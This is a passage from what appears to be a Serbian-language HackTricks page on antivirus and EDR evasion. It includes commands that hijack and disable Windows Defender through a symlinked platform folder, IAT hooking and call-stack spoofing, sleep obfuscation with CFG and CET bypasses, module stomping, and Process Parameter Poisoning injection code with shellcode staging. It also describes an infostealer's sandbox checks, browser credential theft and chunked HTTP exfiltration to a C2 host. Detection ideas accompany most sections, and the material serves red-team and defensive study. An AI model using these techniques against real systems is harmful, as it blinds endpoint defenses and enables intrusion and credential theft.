set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma više verzije unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) izvršava iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Takođe bi trebalo da uočite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Odbacite/zamenite DLL-ove koje Defender učitava iz direktorijuma aplikacije da biste izvršili kod u Defender procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da se pri sledećem pokretanju konfigurisana putanja ne može razrešiti i Defender ne uspe da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; zahtevaju se administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu premestiti runtime evasion iz C2 implanta u sam ciljni modul tako što će hook-ovati njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz napadačev position-independent code (PIC). Ovo proširuje evasion izvan malog API skupa koji mnogi kit-ovi izlažu (npr. CreateProcessA) i pruža istu zaštitu za BOF-ove i post-exploitation DLL-ove.

Pristup na visokom nivou
- Stage-ujte PIC blob uz ciljni modul koristeći reflective loader (prepending ili companion). PIC mora biti samostalan i position-independent.
- Kada se host DLL učita, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose za ciljane import-e (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da pokazuju na tanke PIC wrapper-e.
- Svaki PIC wrapper izvršava evasion radnje pre tail-calling-a stvarne API adrese. Tipične evasion radnje uključuju:
- Maskiranje/demaskiranje memorije oko poziva (npr. enkripcija beacon regiona, RWX→RX, promena naziva/permissions stranica), a zatim vraćanje nakon poziva.
- Call-stack spoofing: konstruisanje benignog stack-a i prelazak u ciljni API tako da call-stack analiza razreši očekivane frejmove.
- Radi kompatibilnosti, eksportujte interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je koje treba hook-ovati za Beacon, BOF-ove i post-ex DLL-ove.

Zašto ovde koristiti IAT hooking
- Funkcioniše za svaki kod koji koristi hook-ovani import, bez menjanja koda alata ili oslanjanja na Beacon da proxy-uje određene API-je.
- Pokriva post-ex DLL-ove: hook-ovanje LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/stack evasion-a na njihove API pozive.
- Vraća pouzdanu upotrebu post-ex komandi za kreiranje procesa protiv detekcija zasnovanih na call-stack-u, obmotavanjem CreateProcessA/W.

Minimalni IAT hook prikaz (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR-a, a pre prve upotrebe importa. Reflective loader-i kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrappers treba da budu mali i PIC-safe; pravu API funkciju razreši preko originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call-stack spoofing stub
- Draugr-style PIC stub-ovi formiraju lažni call chain (return adrese unutar benignih modula), a zatim prelaze u pravu API funkciju.
- Ovo zaobilazi detekcije koje očekuju canonical stack-ove od Beacon/BOF komponenti do osetljivih API funkcija.
- Kombinuj sa stack cutting/stack stitching tehnikama kako bi se dospelo unutar očekivanih frame-ova pre API prologa.

Operativna integracija
- Dodaj reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor script za registraciju ciljnih API funkcija kako bi Beacon i BOF komponente transparentno koristile isti evasion path bez izmena koda.

Detekcija/DFIR razmatranja
- IAT integritet: entries koji se razrešavaju u non-image (heap/anon) adrese; periodična verifikacija import pointer-a.
- Anomalije stack-a: return adrese koje ne pripadaju učitanim image-ima; nagli prelazi na non-image PIC; nedosledna RtlUserThreadStart ancestry.
- Loader telemetry: upisi u IAT unutar procesa, rana DllMain aktivnost koja menja import thunk-ove, neočekivani RX regioni kreirani pri učitavanju.
- Image-load evasion: ako se hook-uje LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assembly-ja povezana sa memory masking događajima.

Povezani building blocks i primeri
- Reflective loader-i koji obavljaju IAT patching tokom učitavanja (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub-ovi (npr. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks putem rezidentnog PICO-a

Ako kontrolišeš reflective loader, možeš da hook-uješ importe **tokom `ProcessImports()`** tako što zameniš loader-ov `GetProcAddress` pointer prilagođenim resolver-om koji prvo proverava hooks:

- Napravi **resident PICO** (persistent PIC object) koji opstaje nakon što se transient loader PIC oslobodi.
- Export-uj `setup_hooks()` funkciju koja prepisuje loader-ov import resolver (npr. `funcs.GetProcAddress = _GetProcAddress`).
- U `_GetProcAddress` preskoči ordinal importe i koristi hash-based hook lookup, kao što je `__resolve_hook(ror13hash(name))`. Ako hook postoji, vrati ga; u suprotnom prosledi poziv pravom `GetProcAddress`.
- Registruj hook targets u link time-u pomoću Crystal Palace `addhook "MODULE$Func" "hook"` entries. Hook ostaje validan zato što se nalazi unutar resident PICO-a.

Ovo omogućava **import-time IAT redirection** bez patchovanja code section-a učitanog DLL-a nakon učitavanja.

### Forsiranje hookable importa kada target koristi PEB-walking

Import-time hooks se aktiviraju samo ako se funkcija zaista nalazi u target-ovom IAT-u. Ako modul razrešava API funkcije pomoću PEB-walk + hash pristupa (bez import entry-ja), forsiraj pravi import kako bi loader-ov `ProcessImports()` path video tu funkciju:

- Zameni hashed export resolution (npr. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) direktnom referencom kao što je `&WaitForSingleObject`.
- Compiler će generisati IAT entry, čime se omogućava interception kada reflective loader razrešava importe.

### Ekko-style sleep/idle obfuscation bez patchovanja `Sleep()`

Umesto patchovanja funkcije `Sleep`, hook-uj stvarne wait/IPC primitives koje implant koristi (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Za duga čekanja, obmotaj poziv Ekko-style obfuscation chain-om koji encrypt-uje image u memoriji tokom idle perioda:

- Koristi `CreateTimerQueueTimer` za zakazivanje niza callback-ova koji pozivaju `NtContinue` sa pripremljenim `CONTEXT` frame-ovima.
- Tipičan chain (x64): postavi image na `PAGE_READWRITE` → RC4 encrypt preko `advapi32!SystemFunction032` nad celim mapped image-om → izvrši blocking wait → RC4 decrypt → **restore per-section permissions** prolaskom kroz PE sections → signalizuj završetak.
- `RtlCaptureContext` obezbeđuje template `CONTEXT`; kloniraj ga u više frame-ova i postavi registre (`Rip/Rcx/Rdx/R8/R9`) tako da pozivaju svaki korak.

Operativni detalj: vrati “success” za duga čekanja (npr. `WAIT_OBJECT_0`) kako bi caller nastavio izvršavanje dok je image masked. Ovaj pattern skriva modul od scanner-a tokom idle prozora i izbegava klasični signature za “patched `Sleep()`”.

Ideje za detekciju (na osnovu telemetry-ja)
- Burst-ovi `CreateTimerQueueTimer` callback-ova koji upućuju na `NtContinue`.
- `advapi32!SystemFunction032` korišćen nad velikim, kontinuiranim buffer-ima veličine image-a.
- `VirtualProtect` nad velikim range-om, nakon čega sledi prilagođeno vraćanje per-section permissions.

### Runtime CFG registration za sleep-obfuscation gadgets

Na CFG-enabled target-ima, prvi indirect jump u mid-function gadget, kao što je `jmp [rbx]` ili `jmp rdi`, obično će oboriti proces sa `STATUS_STACK_BUFFER_OVERRUN`, zato što gadget nije prisutan u CFG metadata modula. Da bi Ekko/Kraken-style chain-ovi opstali unutar hardened procesa:

- Registruj svaku indirect destination koju chain koristi pomoću `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i `CFG_CALL_TARGET_VALID` entries.
- Za adrese unutar učitanih image-a (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` mora da počinje na **image base-u** i da obuhvata **punu veličinu image-a**.
- Za manually mapped/PIC/stomped regione koristi **allocation base** i umesto toga veličinu alokacije.
- Obeleži ne samo dispatch gadget već i exports do kojih se dolazi indirektno (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), kao i sve attacker-controlled executable sections koje će postati indirect targets.

Ovim se ROP/JOP-style sleep chain-ovi pretvaraju iz primitive koja “radi samo u non-CFG procesima” u reusable primitive za `explorer.exe`, browser-e, `svchost.exe` i druge endpoint-e kompajlirane sa `/guard:cf`.

### CET-safe stack spoofing za sleeping thread-ove

Potpuna zamena `CONTEXT`-a je upadljiva i može da izazove probleme na CET Shadow Stack sistemima, zato što spoofed `Rip` i dalje mora da bude usklađen sa hardware shadow stack-om. Bezbedniji sleep-masking pattern je:

- Izaberi drugi thread u istom procesu i pročitaj njegove NT_TIB / TEB stack bounds (`StackBase`, `StackLimit`) preko `NtQueryInformationThread`.
- Sačuvaj trenutni realni TEB/TIB.
- Capturuj realni sleeping context pomoću `GetThreadContext`.
- Kopiraj **samo realni `Rip`** u spoof context, ostavljajući spoofed `Rsp`/stack state netaknutim.
- Tokom sleep window-a, kopiraj spoof thread-ov `NT_TIB` u trenutni TEB kako bi stack walker-i unwind-ovali unutar legitimnog stack range-a.
- Nakon završetka wait-a, restore-uj originalni TIB i thread context.

Ovo čuva CET-consistent instruction pointer, dok dovodi u zabludu EDR stack walker-e koji veruju TEB stack metadata-ju prilikom validacije unwind-ova.

### APC-based alternativa: Kraken Mask

Ako je timer-queue dispatch previše signatured, ista sleep-encrypt-spoof-restore sekvenca može se izvršiti iz suspended helper thread-a pomoću queued APC-ova:

- Kreiraj helper thread sa `NtTestAlert` kao entrypoint-om.
- Queue-uj pripremljene `CONTEXT` frame-ove/APC-je pomoću `NtQueueApcThread` i prazni ih pomoću `NtAlertResumeThread`.
- Čuvaj chain state na heap-u umesto na helper stack-u kako bi se izbeglo iscrpljivanje podrazumevanog 64 KB thread stack-a.
- Koristi `NtSignalAndWaitForSingleObject` za atomsko signalizovanje start event-a i blokiranje.
- Suspenduj main thread pre restore-ovanja TIB/context-a (`NtSuspendThread` → restore → `NtResumeThread`) kako bi se smanjio race window tokom kog scanner može da uhvati polu-restore-ovan stack.

Ovim se `CreateTimerQueueTimer` + `NtContinue` signature zamenjuje helper-thread/APC signature-om, uz zadržavanje istih ciljeva RC4 masking-a i stack spoofing-a.

Dodatne ideje za detekciju
- `NtSetInformationVirtualMemory` sa `VmCfgCallTargetInformation` neposredno pre sleep-ova, wait-ova ili APC dispatch-a.
- `GetThreadContext`/`SetThreadContext` obmotan oko `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ili `ConnectNamedPipe`.
- `NtQueryInformationThread` nakon kog slede direktni upisi u TEB/TIB stack bounds trenutnog thread-a.
- `NtQueueApcThread`/`NtAlertResumeThread` chain-ovi koji indirektno dolaze do `SystemFunction032`, `VirtualProtect` ili helper-a za vraćanje section permissions.
- Ponovljena upotreba kratkih gadget signatures, kao što su `FF 23` (`jmp [rbx]`) ili `FF E7` (`jmp rdi`), kao dispatch pivots unutar signed modula.


## Precision Module Stomping

Module stomping izvršava payload iz **`.text` section-a DLL-a koji je već mapiran unutar target procesa**, umesto alokacije očigledne private executable memorije ili učitavanja novog sacrificial DLL-a. Target za overwrite treba da bude **učitan, disk-backed image** čiji code space može da primi payload bez korumpiranja code path-ova koji su procesu i dalje potrebni.

### Pouzdan izbor targeta

Naive stomping nad uobičajenim modulima kao što su `uxtheme.dll` ili `comctl32.dll` je fragilan: DLL možda nije učitan u remote procesu, a premali code region će oboriti proces. Pouzdaniji workflow je:

1. Enumeriši module target procesa i zadrži **names-only include list** DLL-ova koji su već učitani.
2. Prvo build-uj payload i zabeleži njegovu **tačnu veličinu u bajtovima**.
3. Skeniraj candidate DLL-ove na disku i uporedi PE section **`.text` `Misc_VirtualSize`** sa veličinom payload-a. Ovo je važnije od veličine fajla zato što odražava veličinu executable section-a **kada je mapiran u memoriju**.
4. Parsiraj **Export Address Table (EAT)** i izaberi RVA export-ovane funkcije kao početni offset za stomp.
5. Izračunaj **blast radius**: ako payload premašuje granicu izabrane funkcije, overwrite-ovaće susedne exports raspoređene nakon nje u memoriji.

Tipični recon/selection helpers koji se mogu videti u praksi:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operativne napomene
- Dajte prednost DLL-ovima koji su **već učitani** u udaljenom procesu kako biste izbegli telemetriju funkcije `LoadLibrary`/neočekivanih učitavanja image-a.
- Dajte prednost export-ima koji se ciljnom aplikacijom retko izvršavaju; u suprotnom, normalni tokovi koda mogu pristupiti izmenjenim bajtovima pre ili nakon kreiranja niti.
- Veliki implant-i često zahtevaju promenu načina ugrađivanja shellcode-a sa string literala na **byte-array/braced initializer**, kako bi ceo bafer bio pravilno predstavljen u injector izvornom kodu.

Ideje za detekciju
- Udaljeni upisi u **image-backed izvršne stranice** (`MEM_IMAGE`, `PAGE_EXECUTE*`) umesto u uobičajenije private RWX/RX alokacije.
- Export entry point-i čiji se bajtovi u memoriji više ne podudaraju sa odgovarajućim fajlom na disku.
- Udaljene niti ili context pivoti koji počinju izvršavanje unutar legitimnog DLL export-a čiji su prvi bajtovi nedavno izmenjeni.
- Sumnjive sekvence `VirtualProtect(Ex)` / `WriteProcessMemory` nad DLL `.text` stranicama, nakon kojih sledi kreiranje niti.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) je **process-injection / EDR-evasion** tehnika koja izbegava klasičan remote write put (`VirtualAllocEx` + `WriteProcessMemory`). Umesto kopiranja bajtova u već pokrenuti ciljni proces, ona zloupotrebljava činjenicu da Windows **kopira odabrane `CreateProcessW` startup parametre u child proces** i smešta ih unutar `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Poisonable carriers koje `CreateProcessW` kopira

Korisni carriers su:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (sa `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktična ograničenja carriers-a:

- `lpCommandLine` mora pokazivati na **writable memory** za `CreateProcessW`, a ograničen je na **32.767 Unicode karaktera**, uključujući null terminator.
- `lpEnvironment` mora biti Unicode environment block uzastopnih `NAME=VALUE\0` stringova, završen dodatnim `\0`.
- `lpReserved` je zvanično rezervisan, pa mapiranje na `ShellInfo` treba posmatrati kao implementation detail, a ne kao stabilan dokumentovan contract.

Ovim se normalno kreiranje procesa pretvara u **payload-transfer primitive**. Operator kreira child proces sa startup podacima pod kontrolom napadača i prepušta Windows-u da obavi cross-process kopiranje.

### Remote lookup flow bez remote write API-ja

Nakon kreiranja child procesa, kopirani bafer se razrešava pomoću **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → dobaviti `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Pročitati udaljeni `PEB`
3. Pratiti `PEB.ProcessParameters`
4. Pročitati `RTL_USER_PROCESS_PARAMETERS`
5. Upotrebiti izabrani pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimalni flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Izvršavanje kopiranog bafera parametara

Kopirani region parametara je obično `RW`, a ne izvršiv. Uobičajeni P3 chain je:

1. Kreirati proces na uobičajen način (ne suspendovan)
2. Učiniti izabranu stranicu parametara izvršivom pomoću `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponovo upotrebiti handle glavne niti koji je već vraćen u `PROCESS_INFORMATION`
4. Preusmeriti izvršavanje pomoću `NtSetContextThread` (`CONTEXT_CONTROL`, prepisati `RIP`)

Za razliku od klasičnih workflow-a za hijacking niti, ovo **ne zahteva** `SuspendThread` / `ResumeThread`; kontekst se može promeniti direktno preko vraćenog handle-a glavne niti.

Ovim se izbegava nekoliko API-ja koji se često nadziru zbog injection-a:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- često i `SuspendThread` / `ResumeThread`

### Ograničenje null-bajtova i staged shellcode

Sva tri carrier-a su **string ili string-like podaci**, pa se raw payload koji sadrži `0x00` skraćuje tokom prenosa. Praktično rešenje je **null-free first stage** koji rekonstruiše konstante tokom runtime-a, a zatim učitava proizvoljni second stage.

Jednostavan obrazac je sinteza konstanti zasnovana na XOR-u:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Ovo omogućava da first stage formira stringove za stack, API argumente, DLL putanje ili loader za second-stage shellcode bez ugrađivanja null bajtova u transportovani parametar.

### Stack-based API calls from the first stage

Kada first stage mora da pozove API-je kao što je `LoadLibraryA`, može da:

- postavi string/bufer na stack cilja
- rezerviše **32-byte x64 shadow space**
- postavi `RCX`, `RDX`, `R8`, `R9` na konstante ili pokazivače relativne u odnosu na `RSP`
- zadrži `RSP` **16-byte aligned** pre poziva

Second stage se zatim može kopirati sa stack-a u `PAGE_READWRITE` alokaciju, promeniti u `PAGE_EXECUTE_READ` pomoću `VirtualProtect` i izvršiti skokom, čime se izbegava direktna RWX alokacija.

### Detection ideas

Dobre mogućnosti za hunting koje autori navode:

- `VirtualProtectEx` / `NtProtectVirtualMemory` koji stranice process-parameters postavljaju kao izvršive
- ta promena zaštite praćena pozivom `SetThreadContext` / `NtSetContextThread`
- remote čitanja `PEB`, a zatim `RTL_USER_PROCESS_PARAMETERS`
- neuobičajeno dugi / entropijski visoki `lpCommandLine`, `lpEnvironment` ili `STARTUPINFO.lpReserved` parametri tokom kreiranja procesa

### Notes

- P3 je **cross-process transfer trik**, a ne samostalna full execution primitive: kopirani parametar i dalje zahteva promenu dozvole izvršavanja i metod za preusmeravanje izvršavanja.
- Autori su razmatrali `RtlCreateProcessReflection` / Dirty Vanity, ali su ga odbacili jer interno dolazi do sumnjivih primitives, kao što su `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (poznat i kao BluelineStealer) pokazuje kako moderni info-stealers kombinuju AV bypass, anti-analysis i credential access u jednom workflow-u.

### Keyboard layout gating & sandbox delay

- Config flag (`anti_cis`) nabraja instalirane keyboard layouts pomoću `GetKeyboardLayoutList`. Ako se pronađe Cyrillic layout, sample kreira prazan `CIS` marker i prekida rad pre pokretanja stealers, čime se obezbeđuje da se nikada ne aktivira na isključenim locales, uz istovremeno ostavljanje hunting artifact-a.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita logika `check_antivm`

- Variant A prolazi kroz listu procesa, hešira svaki naziv prilagođenom rolling checksum funkcijom i upoređuje ga sa ugrađenim blocklistama za debuggere/sandbox okruženja; ponavlja checksum za ime računara i proverava radne direktorijume kao što je `C:\analysis`.
- Variant B proverava sistemska svojstva (minimalan broj procesa, nedavno vreme pokretanja sistema), poziva `OpenServiceA("VBoxGuest")` radi otkrivanja VirtualBox dodataka i obavlja provere vremena oko funkcija za spavanje kako bi uočio single-stepping. Svaki pogodak prekida izvršavanje pre pokretanja modula.

### Fileless helper + dvostruko ChaCha20 reflective učitavanje

- Primarni DLL/EXE sadrži Chromium credential helper koji se ili ispušta na disk ili ručno mapira u memoriju; fileless režim sam rešava import-e i relocations, tako da se nikakvi pomoćni artefakti ne upisuju.
- Taj helper čuva DLL druge faze dvostruko šifrovan pomoću ChaCha20 (dva ključa od 32 bajta + nonce-ovi od 12 bajtova). Nakon oba prolaza, reflectively učitava blob (bez `LoadLibrary`) i poziva export-e `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator rutine koriste direct-syscall reflective process hollowing za injection u aktivan Chromium browser, nasleđuju AppBound Encryption ključeve i dešifruju lozinke/cookies/payment cards direktno iz SQLite baza uprkos ABE hardening-u.


### Modularno prikupljanje u memoriji i chunked HTTP exfil

- `create_memory_based_log` iterira kroz globalnu tabelu pokazivača na funkcije `memory_generators` i pokreće po jednu nit za svaki omogućen modul (Telegram, Discord, Steam, screenshots, dokumenti, browser extensions itd.). Svaka nit upisuje rezultate u deljene buffere i prijavljuje broj svojih fajlova nakon prozora za join od približno 45 s.
- Po završetku, sve se pakuje pomoću statički linkovane biblioteke `miniz` kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim čeka 15 s i šalje arhivu u chunk-ovima od 10 MB putem HTTP POST zahteva na `http://<C2>:6767/upload`, imitirajući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, a poslednji chunk dodaje `complete: true` kako bi C2 znao da je reassembly završen.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
